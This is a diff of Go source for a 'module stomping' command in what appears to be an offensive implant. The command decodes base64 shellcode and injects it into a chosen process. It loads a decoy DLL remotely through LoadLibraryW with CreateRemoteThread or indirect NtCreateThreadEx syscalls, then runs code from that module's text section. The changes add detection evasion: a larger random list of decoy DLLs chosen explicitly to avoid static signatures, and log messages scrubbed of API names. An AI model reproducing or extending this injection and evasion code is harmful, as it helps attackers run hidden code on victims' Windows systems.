@@ -47,7 +47,7 @@ type moduleStompingParams struct {
 
 func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult {
 	if runtime.GOOS != "windows" {
-		return errorResult("Error: This command is only supported on Windows")
+		return errorResult("This command is only supported on Windows")
 	}
 
 	params, parseErr := unmarshalParams[moduleStompingParams](task)
@@ -57,18 +57,21 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil || len(shellcode) == 0 {
-		return errorResult("Error: invalid or empty shellcode data")
+		return errorResult("invalid or empty shellcode data")
 	}
 
 	if params.PID <= 0 {
-		return errorResult("Error: invalid PID specified")
+		return errorResult("invalid PID specified")
 	}
 
 	if params.DllName == "" {
 		// Pick a random benign DLL — avoids a static signature on a single default
 		stompDLLs := []string{
-			"xpsservices.dll", "WININET.dll", "amsi.dll", "TextShaping.dll",
-			"msvcp_win.dll", "urlmon.dll", "dwrite.dll", "wintypes.dll",
+			"xpsservices.dll", "TextShaping.dll", "msvcp_win.dll", "dwrite.dll",
+			"wintypes.dll", "windows.storage.dll", "propsys.dll", "profapi.dll",
+			"dpapi.dll", "cryptbase.dll", "devobj.dll", "wldp.dll",
+			"wtsapi32.dll", "dwmapi.dll", "uxtheme.dll", "WindowsCodecs.dll",
+			"winnlsres.dll", "dxgi.dll", "d3d11.dll", "iertutil.dll",
 		}
 		r := rand.New(rand.NewSource(time.Now().UnixNano()))
 		params.DllName = stompDLLs[r.Intn(len(stompDLLs))]
@@ -156,7 +159,7 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 	if IndirectSyscallsAvailable() {
 		status := IndirectNtCreateThreadEx(&hThread, hProcess, textAddr)
 		if status != 0 {
-			sb.WriteString(fmt.Sprintf("[!] NtCreateThreadEx failed: NTSTATUS 0x%X\n", status))
+			sb.WriteString(fmt.Sprintf("[!] remote thread creation failed: status 0x%X\n", status))
 			return errorResult(sb.String())
 		}
 	} else {
@@ -164,7 +167,7 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 		hThread, _, err = procCreateRemoteThread.Call(hProcess, 0, 0, textAddr, 0, 0,
 			uintptr(unsafe.Pointer(&tid)))
 		if hThread == 0 {
-			sb.WriteString(fmt.Sprintf("[!] CreateRemoteThread failed: %v\n", err))
+			sb.WriteString(fmt.Sprintf("[!] remote thread creation failed: %v\n", err))
 			return errorResult(sb.String())
 		}
 	}
@@ -202,28 +205,28 @@ func stompLoadRemoteDLL(hProcess uintptr, pid uint32, dllName string, sb *string
 
 	// Get LoadLibraryW address (kernel32 is loaded at same base in all processes)
 	loadLibAddr := procLoadLibraryWStomp.Addr()
-	sb.WriteString(fmt.Sprintf("[*] LoadLibraryW at 0x%X\n", loadLibAddr))
+	sb.WriteString(fmt.Sprintf("[*] library loader at 0x%X\n", loadLibAddr))
 
 	// Create remote thread to call LoadLibraryW(pathAddr)
 	var hThread uintptr
 	if IndirectSyscallsAvailable() {
 		status := IndirectNtCreateThreadExWithArg(&hThread, hProcess, loadLibAddr, pathAddr)
 		if status != 0 {
-			return 0, fmt.Errorf("NtCreateThreadEx(LoadLibraryW) failed: NTSTATUS 0x%X", status)
+			return 0, fmt.Errorf("remote library load thread failed: status 0x%X", status)
 		}
 	} else {
 		var tid uintptr
 		hThread, _, err = procCreateRemoteThread.Call(hProcess, 0, 0, loadLibAddr, pathAddr, 0,
 			uintptr(unsafe.Pointer(&tid)))
 		if hThread == 0 {
-			return 0, fmt.Errorf("CreateRemoteThread(LoadLibraryW) failed: %w", err)
+			return 0, fmt.Errorf("remote library load thread failed: %w", err)
 		}
 	}
 
 	// Wait for LoadLibraryW to complete (30s timeout)
 	windows.WaitForSingleObject(windows.Handle(hThread), 30000)
 	injectCloseHandle(hThread)
-	sb.WriteString("[+] LoadLibraryW completed\n")
+	sb.WriteString("[+] library load completed\n")
 
 	// Find loaded module base via toolhelp32 snapshot
 	dllBase, err := stompFindModule(pid, dllName)
